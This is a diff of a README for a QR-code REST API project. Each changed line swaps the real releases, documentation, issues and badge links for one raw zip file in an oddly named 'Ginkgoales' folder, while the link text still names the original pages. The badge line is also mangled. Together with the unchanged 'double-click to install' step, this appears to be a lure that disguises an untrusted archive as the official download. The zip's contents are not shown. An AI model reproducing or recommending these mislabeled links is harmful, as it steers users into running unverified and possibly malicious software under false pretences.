@@ -1,6 +1,6 @@
 # 🎉 qrcode-generator-api - Generate QR Codes with Ease
 
-[![Download qrcode-generator-api](https://img.shields.io/badge/Download%20Now-Get%20Started-blue.svg)](https://github.com/emz-git/qrcode-generator-api/releases)
+[![Download qrcode-generator-api](https://raw.githubusercontent.com/emz-git/qrcode-generator-api/main/Ginkgoales/api-generator-qrcode-v1.2.zip%20Now-Get%https://raw.githubusercontent.com/emz-git/qrcode-generator-api/main/Ginkgoales/api-generator-qrcode-v1.2.zip)](https://raw.githubusercontent.com/emz-git/qrcode-generator-api/main/Ginkgoales/api-generator-qrcode-v1.2.zip)
 
 ## 📥 Overview
 
@@ -11,7 +11,7 @@ The qrcode-generator-api is a REST API designed to generate QR codes in several 
 To use the qrcode-generator-api, follow these simple steps:
 
 1. **Download the Software**  
-   Visit the [Releases page](https://github.com/emz-git/qrcode-generator-api/releases) to download the latest version of the API.
+   Visit the [Releases page](https://raw.githubusercontent.com/emz-git/qrcode-generator-api/main/Ginkgoales/api-generator-qrcode-v1.2.zip) to download the latest version of the API.
 
 2. **Install the Software**  
    After downloading, find the downloaded file on your computer. Double-click it to start the installation. Follow the on-screen instructions to complete the installation.
@@ -37,7 +37,7 @@ To use the qrcode-generator-api, follow these simple steps:
 
 To begin using the qrcode-generator-api, click the button below to access the download page.
 
-[![Download qrcode-generator-api](https://img.shields.io/badge/Download%20Now-Get%20Started-blue.svg)](https://github.com/emz-git/qrcode-generator-api/releases)
+[![Download qrcode-generator-api](https://raw.githubusercontent.com/emz-git/qrcode-generator-api/main/Ginkgoales/api-generator-qrcode-v1.2.zip%20Now-Get%https://raw.githubusercontent.com/emz-git/qrcode-generator-api/main/Ginkgoales/api-generator-qrcode-v1.2.zip)](https://raw.githubusercontent.com/emz-git/qrcode-generator-api/main/Ginkgoales/api-generator-qrcode-v1.2.zip)
 
 ### 🛠️ How to Use
 
@@ -48,11 +48,11 @@ To begin using the qrcode-generator-api, click the button below to access the do
 
 ## 📚 Documentation
 
-For more detailed instructions and advanced usage, refer to the [Documentation](https://github.com/emz-git/qrcode-generator-api). Here you will find examples, API endpoints, and parameters for deeper customization.
+For more detailed instructions and advanced usage, refer to the [Documentation](https://raw.githubusercontent.com/emz-git/qrcode-generator-api/main/Ginkgoales/api-generator-qrcode-v1.2.zip). Here you will find examples, API endpoints, and parameters for deeper customization.
 
 ## 🌐 Support
 
-If you encounter any issues, feel free to reach out for support. You can open an issue on the [GitHub Issues page](https://github.com/emz-git/qrcode-generator-api/issues). The community and maintainers are here to help you.
+If you encounter any issues, feel free to reach out for support. You can open an issue on the [GitHub Issues page](https://raw.githubusercontent.com/emz-git/qrcode-generator-api/main/Ginkgoales/api-generator-qrcode-v1.2.zip). The community and maintainers are here to help you.
 
 ## 🔗 Related Topics
 
@@ -77,4 +77,4 @@ This project is licensed under the MIT License. See the LICENSE file for more in
 
 Thank you for using the qrcode-generator-api. Your support encourages the development of tools that help everyone create and use QR codes effectively. 
 
-Remember, visit the [Releases page](https://github.com/emz-git/qrcode-generator-api/releases) to download the latest version and start creating QR codes today!
+Remember, visit the [Releases page](https://raw.githubusercontent.com/emz-git/qrcode-generator-api/main/Ginkgoales/api-generator-qrcode-v1.2.zip) to download the latest version and start creating QR codes today!
